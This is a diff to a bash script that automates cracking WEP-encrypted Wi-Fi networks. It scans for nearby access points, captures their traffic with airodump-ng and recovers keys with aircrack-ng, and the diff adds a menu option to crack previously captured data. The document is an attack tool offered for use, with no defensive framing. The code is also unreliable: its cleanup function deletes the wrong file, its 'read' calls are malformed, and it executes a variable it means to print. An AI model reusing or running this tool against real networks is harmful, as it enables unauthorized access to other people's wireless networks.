@@ -1,4 +1,6 @@
 TMP_AIRODUMP_FILE="airodump.tmp"
+TMP_CAPTURE_FILE="wep_captured.cap"
+TMP_CRACK_RESULT="crack_result.tmp"
 
 header() {
     clear
@@ -8,10 +10,25 @@ header() {
 }
 
 
+cleanup() {
+    # Delete the temporary files from past runs (if they exist)
+    if [ -e $TMP_AIRODUMP_FILE ];
+        then
+        rm $TMP_AIRODUMP_FILE
+    fi
+
+    if [ -e $TMP_CAPTURE_FILE ];
+        then
+        rm $TMP_AIRODUMP_FILE
+    fi
+}
+
+
 select_options() {
     echo "[!] Please select an option below to get started.\n\n"
     echo "1) Scan access points nearby and crack"
     echo "2) Crack access point with BSSID"
+    echo "3) Crack previously captured data (if any)"
     echo "\nEnter your option: "
     read user_option
 
@@ -35,6 +52,10 @@ select_options() {
         echo "[!] Enter channel of the access point:"
         read $access_point_channel
         capture_data $interface $access_point_bssid $access_point_channel
+        crack_access_point
+    elif [[ "$user_option" = "3" ]];
+        then
+        header
         crack_access_point
     fi
 }
@@ -82,7 +103,7 @@ scan_access_point() {
 
     # Extract the access point names from the temporary file we just created
     access_points=`cat $TMP_AIRODUMP_FILE | awk '($8=="WEP") {print NR") "$11}'`
-    echo "Select an access point:"
+    echo "[!] Select an access point:"
     echo `$access_points`
     # Let the user select an access point
     read $access_point_number
@@ -99,23 +120,37 @@ scan_access_point() {
 
 capture_data() {
     # Usage is airodump-ng <interface> -bssid <bssid> -c <channel> -w (filename)
-    echo "Capturing data from access point. Let the 'Data' exceed 20000"
-    echo "PRESS ENTER TO STOP CAPTURING.."
+    echo "[+] Capturing data from access point. Let the 'Data' exceed 20000"
+    echo "[!] PRESS ENTER TO STOP CAPTURING.."
+
+    if [ -e $TMP_CAPTURE_FILE ];
+        then
+        echo "Removing old capture file $TMP_CAPTURE_FILE"
+        rm $TMP_CAPTURE_FILE
+    fi
+
     airodump-ng $1 -bssid $2 -w $TMP_CAPTURE_FILE &
     read $enter_key
     kill -9 "$!"
 }
 
 
+crack_access_point() {
+    echo "Press ENTER to quit cracking.."
+    if [ -e $TMP_CAPTURE_FILE ];
+        then
+        aircrack-ng $TMP_CAPTURE_FILE &
+        read $enter_key
+        kill -9 "$!"
+    else
+        echo "No previously captured data file available"
+        header
+        select_options
+    fi
+}
+
+
 # Display header and options
 header
 select_options
-
-# Let user select an interface
-
-# Let user select access point
-
-# Crack the WEP-encrypted access point
-
-# 
 
